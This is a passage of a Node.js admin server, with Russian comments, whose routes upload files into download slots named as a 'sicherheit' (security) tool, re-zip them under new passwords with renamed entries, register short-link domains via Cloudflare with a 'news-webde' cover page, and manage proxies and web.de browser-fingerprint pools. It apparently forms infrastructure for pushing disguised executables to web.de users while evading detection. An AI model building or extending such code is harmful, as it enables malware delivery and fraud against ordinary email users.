        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const checkId = Date.now() + '-' + Math.random().toString(36).slice(2, 10);
      const targetPath = path.join(CHECK_DIR, checkId);
      try {
        if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const meta = readCheckMeta();
        meta[checkId] = { name: safeName };
        writeCheckMeta(meta);
        const result = { ok: true, fileName: safeName, checkId };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          return send(res, 200, result);
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const runUnzip = (usePassword) => {
          const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
          const cmd = usePassword
            ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
            : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
          const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
          return (r.stdout || '') + (r.stderr || '');
        };
        let out = runUnzip(!!zipPassword);
        let list = parseUnzipList(out);
        if (list.length === 0 && zipPassword) out = runUnzip(false);
        if (list.length === 0) list = parseUnzipList(out);
        finishWithEntries(list);
      } catch (e) {
        try { if (fs.existsSync(targetPath)) fs.unlinkSync(targetPath); } catch (e2) {}
        const meta = readCheckMeta();
        delete meta[checkId];
        writeCheckMeta(meta);
        send(res, 500, { ok: false, error: (e && e.message) || 'Server error' });
      }
    });
    return;
  }

  if (pathname === '/api/config/upload-apply' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const checkId = (json.checkId || '').trim();
      const slotIndex = json.slotIndex != null ? parseInt(json.slotIndex, 10) : -1;
      const useSlot = slotIndex >= 0 && slotIndex < DOWNLOAD_SLOTS_COUNT;
      const meta = readCheckMeta();
      const info = checkId ? meta[checkId] : null;
      const sourcePath = checkId ? path.join(CHECK_DIR, checkId) : null;
      if (!checkId || !info || !sourcePath || !fs.existsSync(sourcePath)) {
        return send(res, 400, { ok: false, error: 'Сначала нажмите Check и загрузите файл' });
      }
      const safeName = info.name;
      const isZip = path.extname(safeName).toLowerCase() === '.zip';
      const asIs = json.asIs === true;
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      /** Имя файла для слота: sicherheit-0.zip, sicherheit-1.exe и т.д. */
      function slotFileName(idx, ext) {
        return 'sicherheit-' + idx + (ext || path.extname(safeName) || '');
      }
      function applyToSlot(finalFileName) {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const finalPath = path.join(DOWNLOADS_DIR, finalFileName);
        fs.copyFileSync(sourcePath, finalPath);
        const config = readDownloadFilesConfig();
        config[slotIndex] = finalFileName;
        writeDownloadFilesConfig(config);
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
        send(res, 200, { ok: true, fileName: finalFileName });
      }
      try {
        if (isZip && asIs && useSlot) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const finalFileName = slotFileName(slotIndex, '.zip');
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          if (currentPassword) writeZipPassword(currentPassword);
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip && asIs) {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          if (currentPassword) writeZipPassword(currentPassword);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        } else if (isZip && useSlot) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalFileName = slotFileName(slotIndex, '.zip');
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          writeZipPassword(newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else if (isZip) {
          const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
          const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
          fs.mkdirSync(tempDir, { recursive: true });
          const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
          const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
          const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
          if (fs.readdirSync(tempDir).length === 0) {
            const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
            const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
            return send(res, 500, { ok: false, error: friendly });
          }
          const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
          function safeSegment(name) {
            const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalPath = path.join(DOWNLOADS_DIR, newZipName);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, finalPath);
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          writeZipPassword(newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: newZipName });
        } else if (useSlot) {
          const finalFileName = slotFileName(slotIndex);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        }
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip';
        }
        send(res, 500, { ok: false, error: friendly });
      }
    });
    return;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = short.listShortLinks().map(function (o) { return { slug: o.code, url: o.url }; });
    return send(res, 200, { shortlinks: list });
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const slug = (json.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
      const url = (json.url || '').trim();
      if (!slug || !url) return send(res, 400, { ok: false, error: 'slug and url required' });
      const result = short.createShortLinkWithCode(slug, url);
      if (!result) return send(res, 400, { ok: false, error: 'invalid slug or url' });
      send(res, 200, { ok: true, slug: result.code, shortUrl: '/s/' + result.code });
    });
    return;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const slug = (parsed.query.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
    if (!slug) return send(res, 400, { ok: false, error: 'slug required' });
    if (!short.deleteShortLink(slug)) return send(res, 404, { ok: false, error: 'not found' });
    send(res, 200, { ok: true });
    return;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = readShortDomains();
    const arr = Object.keys(list).map(function (d) {
      const o = list[d];
      return { domain: d, targetUrl: o.targetUrl || '', whitePageStyle: o.whitePageStyle || '', status: o.status || 'pending', message: o.message || '', ns: o.ns || [] };
    });
    return send(res, 200, { list: arr, serverIp: process.env.SHORT_SERVER_IP || '' });
  }

  if (pathname === '/api/config/short-domains' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let domain = (json.domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].replace(/^www\./, '');
      const targetUrl = (json.targetUrl || '').trim();
      const whitePageStyle = (json.whitePageStyle || '').trim() === 'news-webde' ? 'news-webde' : '';
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      const cfToken = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
      const existing = list[domain];
      const entry = existing
        ? Object.assign({}, existing, { targetUrl: targetUrl || existing.targetUrl || '', whitePageStyle: whitePageStyle || existing.whitePageStyle || '' })
        : { targetUrl: targetUrl || '', whitePageStyle: whitePageStyle, status: 'pending', message: '', ns: [], createdAt: new Date().toISOString() };
      if (existing) {
        list[domain] = entry;
        writeShortDomains(list);
        return send(res, 200, { ok: true, domain: domain, status: entry.status || 'pending', message: entry.message || '' });
      }
      if (cfToken && serverIp) {
        addShortDomainToCloudflare(domain, serverIp, cfToken, function (err, ns) {
          if (err) {
            entry.status = 'error';
            entry.message = err.message || 'Cloudflare error';
            list[domain] = entry;
            writeShortDomains(list);
            return send(res, 200, { ok: true, domain: domain, status: 'error', message: entry.message, list: list });
          }
          entry.ns = ns || [];
          entry.message = ns && ns.length ? 'В Dynadot укажите NS: ' + ns.join(', ') : '';
          list[domain] = entry;
          writeShortDomains(list);
          send(res, 200, { ok: true, domain: domain, status: 'pending', ns: entry.ns, message: entry.message });
        });
      } else {
        entry.message = serverIp ? 'Добавьте домен в Cloudflare, A запись на ' + serverIp + ', в Dynadot укажите NS Cloudflare.' : 'Укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env для автодобавления в CF.';
        list[domain] = entry;
        writeShortDomains(list);
        send(res, 200, { ok: true, domain: domain, status: 'pending', message: entry.message, serverIp: serverIp || '' });
      }
    });
    return;
  }

  if (pathname === '/api/config/short-domains-check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const domain = (json.domain || '').trim().toLowerCase().split('/')[0];
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      if (!list[domain]) return send(res, 404, { ok: false, error: 'domain not in list' });
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      if (!serverIp) return send(res, 200, { ok: false, status: 'error', message: 'SHORT_SERVER_IP не задан' });
      dns.resolve4(domain, function (err, addresses) {
        if (err || !addresses || addresses.length === 0) {
          list[domain].status = 'error';
          list[domain].message = err ? (err.code || err.message) : 'DNS не резолвится';
          writeShortDomains(list);
          return send(res, 200, { ok: true, domain: domain, status: 'error', message: list[domain].message });
        }
        const match = addresses.some(function (a) { return a === serverIp; });
        list[domain].status = match ? 'ready' : 'error';
        list[domain].message = match ? '' : 'IP домена ' + addresses[0] + ' не совпадает с сервером ' + serverIp;
        writeShortDomains(list);
        send(res, 200, { ok: true, domain: domain, status: list[domain].status, message: list[domain].message });
      });
    });
    return;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const domain = (parsed.query.domain || '').trim().toLowerCase().split('/')[0];
    if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
    const list = readShortDomains();
    if (!(domain in list)) return send(res, 404, { ok: false, error: 'not found' });
    delete list[domain];
    writeShortDomains(list);
    send(res, 200, { ok: true });
    return;
  }

  if (pathname === '/api/config/zip-password' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, { password: readZipPassword() });
  }

  if (pathname === '/api/config/zip-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const password = json.password != null ? String(json.password) : '';
      writeZipPassword(password);
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Нормализация строки прокси: принимает http(s)://, socks5://, разделители : ; | tab. Всегда возвращает host:port:login:password (login/password пустые если не указаны). */
  function normalizeProxyLine(raw) {
    const s = String(raw || '').trim();
    if (!s) return null;
    let rest = s.replace(/^\s*(https?|socks5?|socks4?):\/\/\s*/i, '').trim();
    let parts = rest.split(':', 4);
    const portNum = (p) => { const n = parseInt(String(p || '').trim(), 10); return (n >= 1 && n <= 65535) ? n : NaN; };
    if (parts.length >= 2 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    parts = rest.split(/[;\t|]+/);
    if (parts.length >= 2 && parts.length <= 4 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    return null;
  }

  if (pathname === '/api/config/proxies' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const webdeProbeJobId = (q.webdeProbeJobId != null && String(q.webdeProbeJobId).trim()) ? String(q.webdeProbeJobId).trim() : '';
    if (webdeProbeJobId) {
      return sendWebdeFingerprintProbeStatus(res, webdeProbeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(PROXY_FILE)) content = fs.readFileSync(PROXY_FILE, 'utf8');
    } catch (e) {}
    const webdeFp = q.webdeFp === '1' || q.webdeFp === 'true' || q.webdeFp === 'yes';
    if (webdeFp) {
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      // #region agent log
      try {
        fs.appendFileSync(
          '/root/.cursor/debug-461acb.log',
          `${JSON.stringify({
            sessionId: '461acb',
            hypothesisId: 'H6',
            location: 'server.js:proxies-GET-webdeFp',
            message: 'webdeFp bundle',
            data: {
              poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1,
              filePresent: !!poolPayload.filePresent,
            },
            timestamp: Date.now(),
          })}\n`,
          'utf8'
        );
      } catch (eLog) {}
      // #endregion
      return send(res, 200, {
        content,
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
    return send(res, 200, { content });
  }

  if (pathname === '/api/config/proxies' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const hasIndicesOnly = Object.prototype.hasOwnProperty.call(json, 'webdeIndicesContent');
      if (hasIndicesOnly) {
        const indicesC = json.webdeIndicesContent != null ? String(json.webdeIndicesContent) : '';
        try {
          const dir = path.dirname(WEBDE_FP_INDICES_FILE);
          if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
          fs.writeFileSync(WEBDE_FP_INDICES_FILE, indicesC, 'utf8');
          const lineCount = indicesC.split(/\r?\n/).filter(function (l) {
            const t = (l || '').trim();
            return t.length > 0 && !t.startsWith('#');
          }).length;
          console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt (via /api/config/proxies): ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
        } catch (e) {
          return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
        }
        if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
          return send(res, 200, { ok: true });
        }
      }
      const content = json.content != null ? String(json.content) : '';
      if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
        return send(res, 400, { ok: false, error: 'content required for proxy save' });
      }
      try {
        const dir = path.dirname(PROXY_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(PROXY_FILE, content, 'utf8');
        const lineCount = content.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён proxy.txt: ' + PROXY_FILE + ', непустых строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write proxy file' });
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const probeJobId = (q.probeJobId != null && String(q.probeJobId).trim()) ? String(q.probeJobId).trim() : '';
    if (probeJobId) {
      return sendWebdeFingerprintProbeStatus(res, probeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(WEBDE_FP_INDICES_FILE)) content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
    } catch (e) {}
    const poolPayload = buildWebdeFingerprintsListPayload();
    // #region agent log
    try {
      fs.appendFileSync(
        '/root/.cursor/debug-461acb.log',
        `${JSON.stringify({
          sessionId: '461acb',
          hypothesisId: 'H1',
          location: 'server.js:webde-fingerprint-indices-GET',
          message: 'sending content+pool',
          data: {
            poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1,
            filePresent: !!poolPayload.filePresent,
            parseError: poolPayload.parseError || null,
            contentLen: (content || '').length,
          },
          timestamp: Date.now(),
        })}\n`,
        'utf8'
      );
    } catch (eLog) {}
    // #endregion
    return send(res, 200, {
      content,
      pool: poolPayload,
    });
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const content = json.content != null ? String(json.content) : '';
      try {
        const dir = path.dirname(WEBDE_FP_INDICES_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(WEBDE_FP_INDICES_FILE, content, 'utf8');
        const lineCount = content.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt: ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/webde-fingerprints-list' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, buildWebdeFingerprintsListPayload());
  }

  if (pathname === '/api/config/webde-fingerprint-probe-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      return handleWebdeFingerprintProbeStart(res, json);
    });
    return;
  }

  if (pathname === '/api/config/webde-fingerprint-probe-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const jobId = (q.jobId != null && String(q.jobId).trim()) ? String(q.jobId).trim() : '';
    return sendWebdeFingerprintProbeStatus(res, jobId);
  }

  /** Только выдача пула отпечатков + индексов (без проверки прокси). GET + query — если POST-тело режется прокси. */
  if (pathname === '/api/config/proxies-validate' && req.method === 'GET') {
    const q = (parsed && parsed.query) || {};
    if (q.webdeFpBundle === '1' || q.webdeFpBundle === 'true' || q.webdeFpBundle === 'yes') {
      if (!checkAdminAuth(req, res)) return;
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      // #region agent log
      try {
        fs.appendFileSync(
          '/root/.cursor/debug-461acb.log',
          `${JSON.stringify({
            sessionId: '461acb',
            hypothesisId: 'H9',
            location: 'server.js:proxies-validate-GET-webdeFpBundle',
            message: 'GET bundle',
            data: { poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1 },
            timestamp: Date.now(),
          })}\n`,
          'utf8'
        );
      } catch (eLog) {}
      // #endregion
      return send(res, 200, {
        valid: [],
        invalid: [],
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
  }

  /** Проверка прокси: сначала TCP, при отказе — HTTPS через прокси (реальный запрос). */
  if (pathname === '/api/config/proxies-validate' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const pq = (parsed && parsed.query) || {};
      const content = json.content != null ? String(json.content) : '';
      const lines = content.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
      const valid = [];
      const invalid = [];
      const timeoutMs = Math.min(15000, Math.max(3000, parseInt(json.timeoutMs, 10) || 8000));
      const testUrl = 'https://www.web.de/';

      function testProxyTcp(parsed) {
        return new Promise((resolve) => {
